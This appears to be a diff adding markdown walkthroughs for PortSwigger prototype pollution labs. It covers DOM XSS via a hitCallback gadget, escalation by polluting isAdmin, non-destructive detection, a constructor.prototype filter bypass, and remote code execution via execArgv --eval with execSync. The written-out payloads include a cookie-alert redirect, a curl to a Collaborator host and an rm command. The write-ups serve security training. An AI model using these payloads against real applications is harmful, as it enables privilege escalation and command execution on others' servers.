@@ -522,31 +522,261 @@ To solve the lab:
 - modify the payload in the URL to inject and XSS poc like: `/?__pro__proto__to__[transport_url]=data:,alert(1);`
 - observe that the `alert(1)` is called and the lab is solved
 
+### Client-side prototype pollution in third-party libraries
+
+Background:
+
+```
+This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.
+
+To solve the lab:
+
+- Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
+- Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.
+
+This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes. 
+```
+
+- load the lab in burps built in browser
+- enable `dom invader` and enable the prototype pollution option
+- open the browser devtools panel, go to the `DOM invader` tab then reload the page
+- observe that DOM invader has identified two prototype pollution vectors in the `hash` property like in URL fragment string
+- click `scan for gadgets` a new tab opens in which dom invader begins scanning for gadgets using the selected source
+- when the scan is complete open the devtools panel in the same tab as the scan, then go to the `DOM Invader` tab
+- observe that DOM invader has successfully accessed the `setTimeout()` sink via the `hitCallback` gadget
+- click `exploit` dom invader automatically generates a poc exploit and calls `alert(1)`
+- disable dom invader
+- in the browser go to the labs exploit server
+- in the `body` section, craft an exploit that will navigate the vitcim to a malicious URL as follows:
+
+```
+<script>
+    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>
+```
+
+- test the exploit on yourself, making sure that you're navigated to the labs home page and that the `alert(document.cookie)` payload is triggered
+- go back to the exploit server and deliver the exploit to the victim to solve the lab
+
+### Privilege escalation via server-side prototype pollution
+
+Background:
+
+```
+This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
+
+To solve the lab:
+
+- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
+- Identify a gadget property that you can use to escalate your privileges.
+- Access the admin panel and delete the user carlos.
+
+You can log in to your own account with the following credentials: wiener:peter 
+```
+
+**Study the address change feature**
+- log in and visit your account page, submit the form for updating your billing and delivery address
+- in burp history find the `POST /my-account/change-address` request, send it to repeater
+- observe that when submitted, the form data from the fields is sent to the server as JSON
+- notice that the server responds with a JSON object that appears to represent your user, this has been updated to reflect your new address information
+
+**Identify a prototype pollution source**
+- in repeater add a new property to the JSON with the name `__proto__` containing an object with an arbitrary property:
+
+`"__proto__": {
+    "foo":"bar"
+}`
+
+- send the request, and notice the object in the response now includes the arbitrary property that you injected, but no `__proto__` property, this strongly suggests that you have successfully polluted the objects prototype and that your property has been inherited via the prototype chain
+
+**Identify a gadget**
+- look at the additional properties in the response body
+- notice the `isAdmin` proeprty which currently set to `false`
+
+**Craft an exploit**
+- modify the request to try polluting the prototype with your own `isAdmin` property:
+
+```
+"__proto__": {
+    "isAdmin":true
+}
+```
+
+- send the request, and notice that the `isAdmin` value in the response has been updated, this suggests that the object doesn't have its own `isAdmin` property but has instead inherited it from the polluted prototype
+- inthe browser refresh the page and confirm tath you now have a link to access the admin panel
+- go to the admin panel and delete carlos' user
+
+### Detecting server-side prototype pollution without polluted property reflection
+
+Background:
+
+```
+This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
+
+To solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.
+
+You can log in to your own account with the following credentials: wiener:peter 
+```
 
 
+Note: When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.
 
+**Study the address change feature**
+- log in and visit your account page, submit the form for updating your billing and dlivery address
+- in burp history find the `POST /my-account/change-address` request and send to repeater
+- notice that when submitted the data from the fields is sent to the server as JSON, notice that the server responds with a JSON object that appears to represent your user, this has been updated to reflect your new address information
+- in repeater add a new property to the JSON like so:
 
+```
+"__proto__": {
+    "foo":"bar"
+}
+```
 
+- send the request and observe that the object in the response does not reflect the injected property, however this doesn't indicate that the application isn't vulnerable to prototype pollution
 
+**Identify a prototype pollution source**
+- in the request modify the JSON in a way that intentionally breaks syntax, for example delete a comma from the end of one of the lines
+- send the request and observe that you receive an error response in which the body contains a JSON error object
+- notice that although you received a `500` error response, the error object contains a `status` property with the value `400`
+- in the request make the following changes:
+  - fix the JSON syntax by reversing your previous changes
+  - modify the injected property to try polluting the prototype with your own distinct `status` property, remember that htis must be betweeen 400 and 599
 
+```
+    "__proto__": {
+        "status":555
+    }
+```
 
+- send the request and confirm that you receive the normal response containing your object
+- intentionally break the JSON syntax again and reissue the request
+- notice that this time, although you triggered the same error, the `status` and `statusCode` properties in the JSOn response match the arbitrary error code that you injected into `object.prototype` this strongly suggests that you have successfully polluted the prototype and the lab is solved
 
+### Bypassing flawed input filters for server-side prototype pollution
 
+Background:
 
+```
+This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
 
+To solve the lab:
 
+    Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
+    Identify a gadget property that you can use to escalate your privileges.
+    Access the admin panel and delete the user carlos.
 
+You can log in to your own account with the following credentials: wiener:peter 
+```
 
+**Study the address change feature**
+- log in and visit your account page, submit the form for updating your billing and dlivery address
+- in burp history find the `POST /my-account/change-address` request and send to repeater
+- notice that when submitted the data from the fields is sent to the server as JSON, notice that the server responds with a JSON object that appears to represent your user, this has been updated to reflect your new address information
 
+**Identify a prototype pollution source**
+- in repeater add a new property to the JSON with the name `__proto__` containing an object with a `json spaces` property
 
+```
+"__proto__": {
+    "json spaces":10
+}
+```
 
+- send the request and in the `response` panel switch to the `raw` tab, observe that the JSON indentation appears to be unaffected
+- Modify the request to try polluting the prototype via the `constructor` property instead
 
+```
+"constructor": {
+    "prototype": {
+        "json spaces":10
+    }
+}
+```
 
+- resend the request and notice that in the `raw` tab like above again now has JSON indentation that has increased based on the value of your injected property
 
+**Identify a gadget**
+- look at the additional properties in the response body
+- notice the `isAdmin` property, which is currently set to `false`
 
+**Craft an exploit**
+- modify the request to try polluting the prototype with your own `isAdmin` property
 
+```
+"constructor": {
+    "prototype": {
+        "isAdmin":true
+    }
+}
+```
 
+- send the request and notice that the `isAdmin` value in the response has been updated, this suggests that the object doesn't have its own `isAdmin` property but has instead inherited it from the polluted prototype
+- inthe browser refresh the page and confirm that you now have admin access
+- go to the admin panel and delete `carlos` to solve
 
+### Remote code execution via server-side prototype pollution
 
+Background:
 
+```
+This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
 
+Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
+
+To solve the lab:
+- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
+- Identify a gadget that you can use to inject and execute arbitrary system commands.
+- Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.
+
+In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter 
+```
+Hint: The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site. 
+
+**Study the address change feature**
+- log in and visit your account page, submit the form for updating your billing and dlivery address
+- in burp history find the `POST /my-account/change-address` request and send to repeater
+- notice that when submitted the data from the fields is sent to the server as JSON, notice that the server responds with a JSON object that appears to represent your user, this has been updated to reflect your new address information
+
+**Identify a prototype pollution source**
+- in repeater add a new property to the JSON with the name `__proto__` containing an object with a `json spaces` property
+
+```
+"__proto__": {
+    "json spaces":10
+}
+```
+
+- send the request and in the `response` panel switch to the `raw` tab, observe that the JSON indentation appears to have changed due to your value
+
+**Probe for remote code execution**
+- in the browser go to the admin panel and observe that there's a button for running maintenance jobs
+- click the button and observe that this triggers background tasks that clean up the database and filesystem, this is a classic example of the kind of functionality that may spawn node child processes
+- try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. use this to call the `execSync()` sink, passing the command that triggers an interaction with the public burp collaborator server:
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+```
+
+- send the request
+- in the browser, go to the admin panel and trigger the maintenance jobs again, notice that these have both failed this time
+- in burp go to `collaborator` and poll for interactions, observe that you have received several DNS interactions
+
+**Craft an exploit**
+
+- in repeater replace the curl command with a command for deleting carlos' file:
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+```
+
+- send the request
+- go back to the admin panel and trigger the maintenance jobs again, this will delete carlos' file
